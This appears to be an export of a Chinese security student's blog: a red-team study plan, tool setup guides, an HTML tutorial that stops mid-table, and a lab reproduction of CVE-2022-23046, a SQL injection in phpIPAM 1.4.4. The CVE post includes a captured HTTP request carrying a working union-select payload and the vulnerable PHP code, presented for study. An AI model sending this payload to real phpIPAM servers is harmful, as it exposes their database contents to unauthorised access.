[{"title":"学习计划","url":"/01/","content":"\n**目标高级红队工程师**\n\n2022 ----> 2022-12 学习规划\n\n## web安全方向\n\n**学会盲打**\n\n学习html+javascript(想深入挖掘xss的威力得把javascript学好)\n\n学习SQL注入时学习以下SQL语句，熟悉常见的增删改查即可\n\n学习常见的owasp10漏洞，熟悉原理和修复方法\n\n学习python3---->写poc和exp,或者简单的爬虫,基础的脚本\n\n学习php+php代码审计\n\n方法：\"暗月教程+经典的安全书籍(web安全深度刨析)是最快的入门方法\"\n\n学习正则表达式，这个真的很有用啊！强烈推荐\n\n入门先练DVWA，练得熟熟的，\n然后就开始打vulnhub的靶机，\n先从语言入手，工具多练靶场就会了\n记住能短期学会的技术都不值钱\n\n在学习漏洞的过程中，可以去火线或者教育src挖掘一下漏洞\n\n遇到不会的百度即可\n\n不要浪费自己的激情，看书学，遇到不会再查文章学习，\n\n进阶：学习代码审计\n\n> 在学习过程中要形成自己的知识体系\n\n==========================================================\n\n看web安全的书，看的过程中，缺啥补啥\n\n先学着安全，然后再慢慢补知识\n\n>边学安全边补基础\n\n==========================================================\n\n有兴趣有激情的时候赶紧搞，等磨没了就没了\n\n==========================================================\n\n读书顺序\n\n1.白帽子讲web安全\n2.黑客攻防技术宝典-web实战指南第2版\n3.web前端黑客技术解密\n4.web之困\n\n==========================================================\n\n##  内网安全方向\n\n推荐书籍 《内网安全攻防  渗透测试实战指南》\n\n打通web安全和内网安全可以找实习了\n\n=====================================================================\n\n \n\n## 逆向\n\n看着就真的看着，不学就真的5"},{"title":"firmadyne环境搭建","url":"/firmadyne-install/","content":"\n老版本安装成功\n<!-- more -->\n\n```\nUbuntu16.04 86位\nLinux pwn 4.15.0-45-generic #48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:19 UTC 2019 i686 i686 i686 GNU/Linux\npython2.7\n```\n\n\n\n先把老版本的拉下来\n\n```bash\ngit clone --recursive https://github.com/liyansong2018/Old-Firmware-Analysis-Toolkit\n//我拉的时候，由于网速问题经常会拉一半断开\n可以选择下载压缩包下来,解压就可以使用了\nhttps://github.com/liyansong2018/Old-Firmware-Analysis-Toolkit/releases/tag/1.1 //压缩包地址\n\n下载的压缩包没有binaries目录,从github仓库拉下来的有\n```\n\n### 安装pip\n\n```bash\nsudo apt-get install python-pip\n```\n\n### 安装Firmadyne\n\n安装依赖\n\n```\nsudo apt-get install busybox-static fakeroot git dmsetup kpartx netcat-openbsd nmap python-psycopg2 python3-psycopg2 snmp uml-utilities util-linux vlan\n```\n\n因为firmadyne里的download.sh下载源在国外，需要翻墙，这里直接用被人已经下载好的binaries即可。\n\n```bash\ngit clone https://github.com/liyansong2018/Firmadyne-binaries.git\ngit后替换Firmadyne目录内的binaries即可。\n```\n\n下载好之后替换掉Firmadyne目录内的binaries。使用复制方式\n\n再安装其他依赖\n\n```bash\nsudo -H pip install git+https://github.com/ahupp/python-magic //如果安装不了，就重启系统，再安装即可\nsudo -H pip install git+https://github.com/sviehb/jefferson //如果安装不了，就重启系统，再安装即可\nsudo apt-get install qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils\n\n得安装pexpect\n访问https://pypi.python.org/pypi/pexpect //下载压缩包，拉到ubuntu解压\ntar -xzvf 压缩包名称\n进入解压文件夹，执行安装目录\nsudo python ./setup.py install\n安装ptyprocess\n访问https://pypi.python.org/pypi/ptyprocess#downloads //下载压缩包,拉到ubuntu解压\ntar -xzvf 压缩包名称\n进入解压文件夹，执行安装目录\nsudo python ./setup.py install\n```\n\n\n### 安装 sasquatch\n\n```\nsudo apt-get install build-essential liblzma-dev liblzo2-dev zlib1g-dev\ngit clone https://github.com/debug601/sasquatch\ncd sasquatch\n./build.sh\n```\n\n### 安装binwalk\n\n```\nsudo apt-get update\nsudo apt-get install build-essential autoconf git //执行完上面两条命令再执行下面的\n\n将Old-Firmware-Analysis-Toolkit文件夹的binwalk替换为binwalk2.2版本并将binwalk文件夹下面的deps.sh文件某部分进行修改\n修改如下:\n搜索function install_sasquatch\n将git链接替换为: git clone https://github.com/debug601/sasquatch\n----------------------------------------------------------\n\nsudo apt-get remove python-pip //删除pip,但是安装的库还会存在，应对长洪报错使用\nsudo apt-get install python-pip\nsudo python -m pip install --upgrade pip==19.0 //把pip升级到19.0版本\n\ngit clone https://github.com/devttys0/binwalk.git //执行改文件夹的deps.sh文件看看补丁\n//以下的包全部得安装\nsudo apt-get install python-lzma python-crypto\nsudo apt-get install libqt4-opengl python-opengl python-qt4 python-qt4-gl python-numpy python-scipy python-pip\n\nsudo apt-get install git build-essential libqt4-opengl mtd-utils gzip bzip2 tar arj lhasa p7zip p7zip-full cabextract cramfsswap squashfs-tools zlib1g-dev liblzma-dev liblzo2-dev sleuthkit default-jdk lzop srecord cpio python-crypto python-lzo python-lzma python-pip python-tk\n\nsudo pip install pyqtgraph = sudo apt-get install python-pyqtgraph\nsudo apt-get install python-pip\nsudo apt-get install python-capstone\nsudo pip install capstone\nsudo apt-get install python-pyqtgraph\nsudo apt-get install python-matplotlib\nsudo pip install PyQt5\nsudo apt-get install mtd-utils gzip bzip2 tar arj lhasa p7zip p7zip-full cabextract cramfsprogs cramfsswap squashfs-tools cramfsprogs\nsudo apt-get install python3-crypto python3-pip python3-tk\n\nsudo python setup.py install\nsudo ./deps.sh //安装完上面的包，执行这个sh文件\n\n//使用python2安装哦\n```\n\n\n\n### 安装postgresql\n\n```bash\nsudo apt-get install postgresql\nsudo -u postgres createuser -P firmadyne //回车会要求你输入两次密码，输入firmadyne即可\nsudo -u postgres createdb -O firmadyne firmware\nsudo -u postgres psql -d firmware < ./firmadyne/database/schema  （schema具体路径可以在文件内pwd查找）\n```\n\n创建时会提示输密码，就使用firmadyne作为密码方便使用。\n\n\n\n### 修改配置\n\n修改firmadyne文件夹的firmadyne.config文件，修改成绝对路径。\n\n```bash\n//这块本来是注释掉的\n'''\n# uncomment and specify full path to FIRMADYNE repository\n#FIRMWARE_DIR=/home/vagrant/firmadyne/\n'''\n//我们强调#号注释,把FIRMWARE_DIR的路径替换成我们真实的firmadyne路径即可\n# uncomment and specify full path to FIRMADYNE repository\nFIRMWARE_DIR=/home/f5/Old-Firmware-Analysis-Toolkit/firmadyne //将这块修改成你真实的firmadyne路径\n```\n\n将firmware-analysis-toolkit根目录下的两个脚本文件fat.py和reset.py ，拷贝到 firmadyne 目录下。并修改 。主要修改如下，root-pass 修改成你当前系统用户的密码，firmadyne_pass 是其在 postgresql 数据库中的账号密码(修改成firmadyne)。\n\n```bash\n//修改fat.py文件\n#Configurations - change this according to your system\nfirmadyne_path = \"/home/f5/Old-Firmware-Analysis-Toolkit/firmadyne\" //修改成你firmadyne的真实目录\nbinwalk_path = \"/usr/local/bin/binwalk\" //保留\nroot_pass = \"123com\" //修改成你目前系统的root密码\nfirmadyne_pass = \"firmadyne\" //修改成firmadyne\n\n//修改reset.py文件\n# Change the root password according to your system\nroot_pass = \"123.com\" //修改成你目前系统的root密码\nfirm_pass = \"firmadyne\" //修改成firmadyne\n```\n\n\n\n使用FAT\n\n```bash\n进入firmadyne路径，执行以下命令\npython fat.py 固件的绝对路径 //开启FAT\npython fat.py 固件名称即可 //或者也可以把固件防止firmadyne的目录,开启FAT\npython reset.py //清除掉之前模拟固件留下的缓存,建议每此开启之前都执行一次\n```\n\n","categories":["IOT安全"]},{"title":"java1.8环境变量配置","url":"/java-evc/","content":"\n\njava版本\n<!-- more -->\n\n```bash\njava version \"1.8.0_181\"\nJava(TM) SE Runtime Environment (build 1.8.0_181-b13)\nJava HotSpot(TM) 64-Bit Server VM (build 25.181-b13, mixed mode)\n```\n\n\n\n问题: java解释器解释失败\n\n报错: **错误：找不到或无法加载主类**\n\n解决办法\n\n重新配置java环境变量\n\n\n\n系统变量\n\n新建CLASSPATH\n\n```bash\n//填入以下内容\n.;%JAVA_HOME%\\lib;%JAVA_HOME%\\tools.jar\n```\n\n新建JAVA_HOME\n\n```bash\nJAVA_HOME\n//填入你的java安装路径\nD:\\Java\\jdk1.8.0_181\\ //例子\n```\n\n在系统变量找到**Path**点编辑，填入以下内容\n\n```bash\n//java安装路径下jdk文件夹bin目录的路径\nD:\\Java\\jdk1.8.0_181\\bin //例子\n```\n\n\n\n然后点确认确认确认，重启命令行，执行java即可","categories":["Java"]},{"title":"win安装composer","url":"/win-install-composer/","content":"\ncomposer下载地址: https://getcomposer.org/download/\n\n<!-- more -->\n\n点击2.3.4/其他版本下载即可,下载下来的是一个composer.pear的包\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp/composer1.png\" style=\"zoom:67%;\" />\n\n需要创建一个`composer.bat`,内容如下\n\n```bash\n@echo OFF\n:: in case DelayedExpansion is on and a path contains ! \nsetlocal DISABLEDELAYEDEXPANSION\nphp \"%~dp0composer.phar\" %*\n```\n\n准备好之后，把`composer.pear`和`composer.bat`一起放到你需要安装的php版本\n\n我这边选择的是`php8.0.2`\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp/composer2.png\" style=\"zoom:150%;\" />\n\n然后就把php8.0.2的路径添加到环境变量-系统变量-Path中，点确认即可\n\n![image-20220413205550292](https://cdn.jsdelivr.net/gh/k0xx11/zp/composer3.png)\n\ncmd执行 composer --version,如果有显示composer版本就是安装成功了\n\n![image-20220413205726010](https://cdn.jsdelivr.net/gh/k0xx11/zp/composer4.png)","categories":["PHP"]},{"title":"CVE-2022-23046复现和分析","url":"/CVE-2022-23046/","content":"\n\n\n1. 漏洞名称: phpipam 1.4.4-SQL lnjection\n\n<!-- more -->\n\n2. 产品版本:  [phpipam 1.4.4](https://github.com/phpipam/phpipam/tree/v1.4.4)\n\n3. 漏洞类型：**SQL Injection**\n\n4. 复现环境\n\n   os: `win7`\n\n   php: `7.3.4nst` 使用集成环境 phpstudy/xmapp/wamp都可以\n\n   > 需要开启的扩展：openssl,gmp,gettext,sockes,php-pear\n   >\n   > php-pear的安装教程文章---> 安装php-pear\n\n   Mysql:  `5.7.26`\n\n5.搭建网站\n\n把源码下载下来之后，解压到你的网站根目录，把`config.dist.php`复制一份再修改为`config.php`\n\n打开config.php文件,修改配置\n\n```\n/**\n * database connection details\n ******************************/\n$db['host'] = 'localhost'; // 数据库连接Ip\n$db['user'] = 'root'; //数据库账号\n$db['pass'] = 'root'; //数据库密码\n$db['name'] = 'phpipam'; //数据库名字\n$db['port'] = 3306; //mysql数据库端口\n```\n\n然后把phpipam-1.4.4目录的文件移到www目录下,然后访问网站`{ip}/index.php`进行安装 \n\n(1)安装完毕之后，登录后台，这个系统的路由模块默认是关闭，所以我们先得把他开启\n\n访问http://ip/index.php?page=administration&section=settings, 找到`Routing module`点击为ON是开启了\n\n![](https://cdn.jsdelivr.net/gh/k0xx11/zp//phpipam-sqla.png)\n\n(2)访问http://ip/index.php?page=tools&section=routing, 点击 `Add peer`添加对等体，\n\n![](https://cdn.jsdelivr.net/gh/k0xx11/zp//phpipam-sqlb.png)\n\n点击`Add`即可\n\n(3)点击设置按钮，选择show BGP\n\n![](https://cdn.jsdelivr.net/gh/k0xx11/zp//phpipam-sqlc.png)\n\n我们就会跳转http://ip/index.php?page=tools&section=routing&subnetId=bgp&sPage=1\n\n点击Actions ---> 点击subnet mapping\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp//phpipam-sqld.png\" style=\"zoom:50%;\" />\n\n弹出页面，拉到最后找到 map new subnet ,在搜索框随便填入内容点击search，打开burp抓包\n\n![](https://cdn.jsdelivr.net/gh/k0xx11/zp//phpipam-sqle.png)\n\n```\n数据包：\nPOST /app/admin/routing/edit-bgp-mapping-search.php HTTP/1.1\nHost: 192.168.1.14\nContent-Length: 59\nAccept: */*\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nOrigin: http://192.168.1.14\nReferer: http://192.168.1.14/index.php?page=tools&section=routing&subnetId=bgp&sPage=1\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nCookie: phpipam=u7sh9e6n3ps2e5o4vafc0th7rf; table-page-size=50; search_parameters={\"addresses\":\"off\",\"subnets\":\"on\",\"vlans\":\"off\",\"vrf\":\"off\",\"pstn\":\"off\",\"circuits\":\"off\",\"customers\":\"off\"}; tools_vlan_2.bs.table.searchText=2001\nConnection: close\n\nsubnet=111\" union select @@version,2,user(),4 -- -&bgp_id=1 //subnet是注入点\n//响应包的内容\n<option value='advertised'>Advertised</option>\t<option value='received'>Received</option></select></td><td> 5.7.26/root@localhost (4)</td><td class='result-0'></td></tr></table>\n\n//payload插入时执行的sql语句\nselect INET_NTOA(`subnet`) as subnet,id,mask,description from `subnets` where INET_NTOA(`subnet`) like \"111\" union select @@version,2,user(),4 -- -%\" and `subnet` > 1 and COALESCE(`isFolder`,0) = 0\n```\n\n\n\n6.漏洞分析\n\n漏洞代码文件`\\app\\admin\\routing\\edit-bgp-mapping-search.php`\n\n```php\n# validates\nif(!is_numeric($_POST['bgp_id']))  \t\t\t{ $Result->show(\"danger\",  _(\"Invalid ID\"), true); }\nif(strlen($_POST['subnet'])<2)\t\t\t\t{ $Result->show(\"danger\",  _(\"Please enter at least 2 characters.\"), true); } //要求输入的字符大于2\n# query\n$query = 'select INET_NTOA(`subnet`) as subnet,id,mask,description from `subnets` where INET_NTOA(`subnet`) like \"'.$_POST['subnet'].'%\" and `subnet` > 1 and COALESCE(`isFolder`,0) = 0'; //然后就把获取的数据\n```\n\n>  漏洞原因就是对输入的内容不进行过滤导致的","categories":["漏洞复现"]},{"title":"php-pear安装","url":"/php-pear-install/","content":"\n**安装步骤**\n\n<!-- more -->\n\n- 下载go-pear.phar下来，把文件复制到你要安装php版本的目录，然后解压再把文件移到php7.3.4nts的目录\n\n  > 我拿php7.3.4nts来做示范\n\n- 执行\n\n  下载地址：[http://pear.php.net/go-pear.phar](https://pear.php.net/go-pear.phar)\n\n\n\n**关键事项**\n\n- 注意事项：第一个一定是选择 local。\n- **第一次执行的时候一定要指定 php的路径，输入13弹出对话框选择PHP的目录。**\n- 之后直接按 Enter 继续。完成！\n\n\n\n**安装过程**\n\n在cmd打开php7.3.4nts路径\n\n```bash\nMicrosoft Windows [版版本本 6.1.7601]\n版版权权所所有有 (c) 2009 Microsoft Corporation。。保保留留所所有有权权利利。。\n\nE:\\phpstudy_pro\\Extensions\\php\\php7.3.4nts>php.exe go-pear.phar\n\nAre you installing a system-wide PEAR or a local copy?\n(system|local) [system] : local\nPlease confirm local copy by typing 'yes' : yes\n\nBelow is a suggested file layout for your new PEAR installation.  To\nchange individual locations, type the number in front of the\ndirectory.  Type 'all' to change all of them or simply press Enter to\naccept these locations.\n\n 1. Installation base ($prefix)                   : E:\\phpstudy_pro\\Extensions\\php\\php7.3.4nts\n 2. Temporary directory for processing            : E:\\phpstudy_pro\\Extensions\\php\\php7.3.4nts\\tmp\n 3. Temporary directory for downloads             : E:\\phpstudy_pro\\Extensions\\php\\php7.3.4nts\\tmp\n 4. Binaries directory                            : E:\\phpstudy_pro\\Extensions\\php\\php7.3.4nts\n 5. PHP code directory ($php_dir)                 : E:\\phpstudy_pro\\Extensions\\php\\php7.3.4nts\\pear\n 6. Documentation directory                       : E:\\phpstudy_pro\\Extensions\\php\\php7.3.4nts\\docs\n 7. Data directory                                : E:\\phpstudy_pro\\Extensions\\php\\php7.3.4nts\\data\n 8. User-modifiable configuration files directory : E:\\phpstudy_pro\\Extensions\\php\\php7.3.4nts\\cfg\n 9. Public Web Files directory                    : E:\\phpstudy_pro\\Extensions\\php\\php7.3.4nts\\www\n10. System manual pages directory                 : E:\\phpstudy_pro\\Extensions\\php\\php7.3.4nts\\man\n11. Tests directory                               : E:\\phpstudy_pro\\Extensions\\php\\php7.3.4nts\\tests\n12. Name of configuration file                    : E:\\phpstudy_pro\\Extensions\\php\\php7.3.4nts\\pear.ini\n13. Path to CLI php.exe                           :\n\n1-13, 'all' or Enter to continue: 13 //就是这次，选择php文件的目录进行，然后回车\nphp.exe (sapi: cli) found.\n\n\nBelow is a suggested file layout for your new PEAR installation.  To\nchange individual locations, type the number in front of the\ndirectory.  Type 'all' to change all of them or simply press Enter to\naccept these locations.\n\n 1. Installation base ($prefix)                   : E:\\phpstudy_pro\\Extensions\\php\\php7.3.4nts\n 2. Temporary directory for processing            : E:\\phpstudy_pro\\Extensions\\php\\php7.3.4nts\\tmp\n 3. Temporary directory for downloads             : E:\\phpstudy_pro\\Extensions\\php\\php7.3.4nts\\tmp\n 4. Binaries directory                            : E:\\phpstudy_pro\\Extensions\\php\\php7.3.4nts\n 5. PHP code directory ($php_dir)                 : E:\\phpstudy_pro\\Extensions\\php\\php7.3.4nts\\pear\n 6. Documentation directory                       : E:\\phpstudy_pro\\Extensions\\php\\php7.3.4nts\\docs\n 7. Data directory                                : E:\\phpstudy_pro\\Extensions\\php\\php7.3.4nts\\data\n 8. User-modifiable configuration files directory : E:\\phpstudy_pro\\Extensions\\php\\php7.3.4nts\\cfg\n 9. Public Web Files directory                    : E:\\phpstudy_pro\\Extensions\\php\\php7.3.4nts\\www\n10. System manual pages directory                 : E:\\phpstudy_pro\\Extensions\\php\\php7.3.4nts\\man\n11. Tests directory                               : E:\\phpstudy_pro\\Extensions\\php\\php7.3.4nts\\tests\n12. Name of configuration file                    : E:\\phpstudy_pro\\Extensions\\php\\php7.3.4nts\\pear.ini\n13. Path to CLI php.exe                           : E:\\phpstudy_pro\\Extensions\\php\\php7.3.4nts\\\n\n1-13, 'all' or Enter to continue:\nBeginning install...\nConfiguration written to E:\\phpstudy_pro\\Extensions\\php\\php7.3.4nts\\pear.ini...\nInitialized registry...\nPreparing to install...\ninstalling phar://E:/phpstudy_pro/Extensions/php/php7.3.4nts/go-pear.phar/PEAR/g\no-pear-tarballs/Archive_Tar-1.4.4.tar...\ninstalling phar://E:/phpstudy_pro/Extensions/php/php7.3.4nts/go-pear.phar/PEAR/g\no-pear-tarballs/Console_Getopt-1.4.1.tar...\ninstalling phar://E:/phpstudy_pro/Extensions/php/php7.3.4nts/go-pear.phar/PEAR/g\no-pear-tarballs/PEAR-1.10.7.tar...\ninstalling phar://E:/phpstudy_pro/Extensions/php/php7.3.4nts/go-pear.phar/PEAR/g\no-pear-tarballs/Structures_Graph-1.1.1.tar...\ninstalling phar://E:/phpstudy_pro/Extensions/php/php7.3.4nts/go-pear.phar/PEAR/g\no-pear-tarballs/XML_Util-1.4.3.tar...\ninstall ok: channel://pear.php.net/Archive_Tar-1.4.4\ninstall ok: channel://pear.php.net/Console_Getopt-1.4.1\ninstall ok: channel://pear.php.net/Structures_Graph-1.1.1\ninstall ok: channel://pear.php.net/XML_Util-1.4.3\ninstall ok: channel://pear.php.net/PEAR-1.10.7\nPEAR: Optional feature webinstaller available (PEAR's web-based installer)\nPEAR: Optional feature gtkinstaller available (PEAR's PHP-GTK-based installer)\nPEAR: Optional feature gtk2installer available (PEAR's PHP-GTK2-based installer)\n\nPEAR: To install optional features use \"pear install pear/PEAR#featurename\"\n\n******************************************************************************\nWARNING!  The include_path defined in the currently used php.ini does not\ncontain the PEAR PHP directory you just specified:\n<E:\\phpstudy_pro\\Extensions\\php\\php7.3.4nts\\pear>\nIf the specified directory is also not in the include_path used by\nyour scripts, you will have problems getting any PEAR packages working.\n\n\nWould you like to alter php.ini <E:\\phpstudy_pro\\Extensions\\php\\php7.3.4nts\\php.\nini>? [Y/n] : y\n\nphp.ini <E:\\phpstudy_pro\\Extensions\\php\\php7.3.4nts\\php.ini> include_path update\nd.\n\nCurrent include path           : .;C:\\php\\pear\nConfigured directory           : E:\\phpstudy_pro\\Extensions\\php\\php7.3.4nts\\pear\n\nCurrently used php.ini (guess) : E:\\phpstudy_pro\\Extensions\\php\\php7.3.4nts\\php.ini\nPress Enter to continue:\n\n** WARNING! Old version found at C:\\Windows\\system32\\pear.bat, please remove it\nor be sure to use the new e:\\phpstudy_pro\\extensions\\php\\php7.3.4nts\\pear.bat co\nmmand\n\nThe 'pear' command is now at your service at e:\\phpstudy_pro\\extensions\\php\\php7.3.4nts\\pear.bat\n\n** The 'pear' command is not currently in your PATH, so you need to\n** use 'e:\\phpstudy_pro\\extensions\\php\\php7.3.4nts\\pear.bat' until you have adde\nd\n** 'E:\\phpstudy_pro\\Extensions\\php\\php7.3.4nts' to your PATH environment variabl\ne.\n\nRun it without parameters to see the available actions, try 'pear list'\nto see what packages are installed, or 'pear help' for help.\n\nFor more information about PEAR, see:\n\n  http://pear.php.net/faq.php\n  http://pear.php.net/manual/\n\nThanks for using go-pear!\n\n\nE:\\phpstudy_pro\\Extensions\\php\\php7.3.4nts>\n```\n\n","categories":["PHP"]},{"title":"html学习","url":"/html-study/","content":"\n## html基本结构\n\n<!-- more -->\n\n```html\n<!DOCTYPE html> <!--声明文档类型-->\n<html lang=\"en\"> <!-- lang属性定义页面语言 -->\n<head> //头部信息写到head标签\n<meta charset=\"UTF-8\" />     <!-- 利用UTF-8格式来解析 -->\n<title>web安全培训</title> //网页标题标签\n</head>\n<body>\n</body>\n</html>\n```\n\n**head 头部标签**\n\n> 优先加载的一般都会写到头部\n\n```html\n<head>\n   <meta charset=\"UTF-8\" />\n   <title>hello world</title>\n</head>\n```\n\n**title标签(网页标题标签)**\n\n```html\n<title>网页标题</title>\n```\n\n\n\n## html常见标签\n\n**meta标签**\n\n```html\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=\"UTF-8\" /> //指定网页的编码类型\n<meta name=\"keywords\" content=\"网络安全,x,x,x\" /> //网站关键字\n<meta name=\"description\" content=\"网络安全牛逼\" /> //网站的一些描述\n<meta name=\"author\" content=\"moon\" /> //网站的作者\n<meta http-equiv=\"refresh\" content=\"30\" /> 每30秒刷新当前页面\n```\n\n**link标签**\n\n> 作用:引入外部或者内部样式表(css文件),定义文档与外部资源的关系\n\n```html\n<link href=\"http://www.hhh.com/1.css\" rel=\"stylesheet\" type=\"text/css\" />\n```\n\n**script标签**\n\n> 作用：引入外部或者内部的js文件\n\n```html\n<script src=\"http://www.hhh.com/one.js\" type=\"test/javascript\"></script>\n```\n\n**base标签**\n\n设置整体链接的打开状态，需要写到head里面\n\n所有链接都会默认添加target=\"_blank\"\n\n> target属性\n>\n> taget=\"_blank\" 在新窗口中打开被链接文档。\n>\n> target=\"_self\" 默认。在相同的窗口中打开被链接文档\n>\n> target=\"_parent\" 在父框架集中打开被链接文档\n>\n> target=\"_top\" 在整个窗口中大姐啊u被链接文档\n>\n> target=\"framename\" 作用在指定框架打开链接\n\n```html\n<base href=\"https://www.baidu.com\" target=\"_blank\" />\n```\n\n**注释标签**\n\n```html\n<!--这是一段注释--> //html注释标签，注释的内部不会在浏览器实现效果 <!--hhh-->\n```\n\n**p标签(段落标签,文本标签)**\n\n```html\n<p>这是一个段落标签</p> //段落标签\n```\n\n**标题标签**\n\n> `<h1-6></h1-6>`\n\n```html\n<h1>h1</h1>\n<h2>h2</h2>\n<h3>h3</h3>\n<h4>h4</h4>\n<h5>h5</h5>\n<h6>h6</h6>\n```\n\n**a标签链接标签**\n\n作用：用于控制页面与页面之间的跳转\n\n> href 作用用于指定链接目标的url地址,必要属性 href=\"#\"-->代表空链接\n>\n> target属性 有`_self`和`_blank` 两个值\n>\n> target=\"_self\" 在当前页面跳转\n>\n> target=\"_blank\" 新建页面跳转\n\n```html\n<a href=\"https://www.baidu.com\">百度</a> //默认在当前页面跳转\n<a href=\"https://www.baidu.com\" target=\"_self\">百度</a>\n<a href=\"https://www.baidu.com\" target=\"_blank\">百度</a>\n```\n\n**扩展**\n\n1.描点文本\n\n```html\n<a name=\"2\"><p>1111111111</p></a>\n<p>1111111111</p>\n<p>1111111111</p>\n<p>1111111111</p>\n<p>1111111111</p>\n<p>1111111111</p>\n<a href=\"#2\">去顶部</a>\n<a name=\"2\"></a> //name=\"2\"-->等于是做了一个标记\n<a href=\"#2\">去顶部</a> //href=\"#2\" --->这个#2就是跳转到name=2的地方\n```\n\n2.图片链接\n\n```html\n<a href=\"src\" ><img src=\"#\"/></a>\n```\n\n3.电子邮箱链接\n\n> **注意:** 单词之间空格使用 %20 代替，以确保浏览器可以正常显示文本。\n\n```html\n<a href=\"mailto:someone@example.com?Subject=Hello%20again\" target=\"_top\">\n发送邮件</a>\n```\n\n**img标签图片标签**\n\n> src属性 eg: `src=\"\"` 属性值填图片的地址; src=\"#\"-->代表空图片\n>\n> width属性 设置图片的宽度 eg: `width=\"10\"`\n>\n> height属性 设置图片的高度 eg:`height=\"10\"`\n>\n> alt属性 作用：图片不显示而替代的文字 eg: `alt=\"hhhhhh\"`\n>\n> title属性 作用：悬停img图片标签提示显示文字 eg: `title=\"hhhh\"`\n>\n> border属性 作用:给图片设置边框，默认为0 属性值 整数值 eg: `border=\"1\"`\n>\n> align属性 作用:设置图片在网页中的水平对齐方式,属性值有left(靠左对齐),center(居中),right(靠右对齐)\n\n```html\n<img src=\"图片地址\" width=\"10\" height=\"10\" alt=\"hhhh\" title=\"hhhh\" border=\"1\"/>\n```\n\n**路径**\n\n路径分绝对路径和相对路径，相对路径又分同一级路径，上一级路径，下一级路径\n\n绝对路径\n\n绝对路径以Web站点根目录为参考基础的目录路径。之所以称为绝对，意指当所有网页引用同一个文件时，所使用的路径都是一样的。\n\n> \"D:\\web\\img\\logo.gif\"，或完整的网络地址，例如\"http://www.itcast.cn/images/logo.gif\"。\n\n相对路径\n\n| 路径分类   | 符号  | 说明                                                         |\n| ---------- | ----- | ------------------------------------------------------------ |\n| 同一级路径 |       | 只需输入图像文件的名称即可，如src='1.png'。                  |\n| 下一级路径 | “/”   | 图像文件位于HTML文件同级文件夹下（例如文件夹名称为：images）  如src='image/2.png'。 |\n| 上一级路径 | “../” | 在文件名之前加入“../”  ，如果是上两级，则需要使用 “../ ../”，以此类推，如src='../3.png'。 |\n\n**列表标签**\n\nhtml列表有有序列表、无序列表和自定义列表\n\n有序列表\n\n有序列表使用ol标签，默认数字表示\n\n> type属性\n>\n> type=\"A\" 大写字母表示\n>\n> type=\"a\" 小写字母表示\n>\n> type=\"I\" 大写罗马字母表示\n>\n> type=\"i\" 小写罗马字母表示\n\n```html\n<ol type=\"A\">\n<li>1</li>\n<li>1</li>\n</ol>\n```\n\n无序列表\n\n无序列表使用ul标签，粗体圆点表示\n\n>  type属性\n>\n> type=\"square\" 正方形列表\n>\n> type=\"circle\" 圆圈列表\n>\n> type=\"disc\" 圆点列表\n\n```html\n<ul type=\"square\">\n<li>1</li>\n<li>1</li>\n</ul>\n```\n\n自定义列表dl\n\n```html\n<dl>\n   <dt>hello</dt>\n   <dd>1</dd>\n   <dt>world</dt>\n   <dd>1</dd>\n</dl>\n```\n\n**html表格**\n\n> 表格由 `<table>` 标签来定义。每行（由 `<tr>` 标签定义），每行的单元格（由 `<td>` 标签定义）\n\n常见的表格框架\n\n```html\n<table>\n<tr>\n   <td>1</td>\n   <td>1</td>\n   <td>1</td>\n</tr>\n</table>\n```\n\ntable表格标签\n\n> border属性 设置表格的边框，默认为0,属性值 像素值(px)\n>\n> width 属性 设置表格的宽度,属性值 像素值(px)\n>\n> height属性 设置表格的高度,单位像素px 属性值 像素值(px) eg: height=\"200px\"\n>\n> cellpadding属性 设置表格边与内容的间距 属性值 像素值(默认2px)\n>\n> cellspacing属性 设置表格的间距 属性值 像素值(默认1px)\n>\n> align属性 设置表格在网页中的水平对齐方式,属性值有left(靠左对齐),center(居中),right(靠右对齐)\n\n**tr标签** \n\n> 定义表格的每行\n\n**td标签** \n\n> 定义表格的每格\n\n> align属性 设置表格在网页中的水平对齐方式,属性值有left(靠左对齐),center(居中),right(靠右对齐)\n\n**表头单元格标签th**\n\n一般表头单元格位于表格的第一行或第一列，并且文本加粗居中\n\n```html\n<table>\n    <tr>\n        <th>1</th>\n        <th>2</th>\n    </tr>\n</table>\n```\n\n**表头标题caption**\n\n一般表头标题显示在表格上面第一行的位置,并且文本居中\n\n```html\n<table>\n<caption>我是表格标题</catpion>\n</table>\n```\n\n**合并单元格**\n\n跨行合并: rowspan=\"合并单元格的个数\"\n\n跨列合并: colspan=\"合并单元格的个数\"\n\n```html\n<table border=\"1\" width=\"300px\" height=\"300px\" cellpadding=\"10\" cellspacing=\"0\" align=\"center\">\n<caption>\n<b>我是表格标题</b>\n</caption>\n<tr>\n   <td align=\"center\">1</td>\n   <td align=\"center\">2</td>\n   <td align=\"center\">2</td>\n</tr>\n<tr>\n   <td align=\"center\">2</td>\n   <td align=\"center\">2</td>\n   <td align=\"center\">2</td>\n</tr>\n<tr>\n   <td align=\"center\">内核</td>\n   <td align=\"center\">内核</td>\n   <td align=\"center\">内核</td>\n</tr>\n</table>\n\n把第三行的内核最底部那行合并，就是跨列合并，代码如下\n<tr>\n   <td align=\"center\" colspan=\"2\">内核</td>\n</tr>\n把第一行和第二行中间的数字而合并，代码如下\n//思路 先得把第二行中间数字2的代码删除掉\n<tr>\n   <td align=\"center\">1</td>\n   <td align=\"center\" rowspan=\"2\">2</td>\n   <td align=\"center\">2</td>\n</tr>\n<tr>\n   <td align=\"center\">2</td>\n   <td align=\"center\">2</td>\n</tr>\n```\n\n合并单元格顺序\n\n**合并的顺序我们按照 先上 后下 先左 后右 的顺序**\n\n例子：\n\n```html\n<table border=\"1\" cellpadding=\"10\" cellspacing=\"0\" width=\"200px\" height=\"300px\">\n<tr>\n   <th>1</th>\n   <th>1</th>\n   <th>1</th>\n</tr>\n<tr>\n   <td>1</td>\n   <td>1</td>\n   <td>1</td>\n</tr>\n<tr>\n   <td>1</td>\n   <td>1</td>\n   <td>1</td>\n</tr>\n<tr>\n   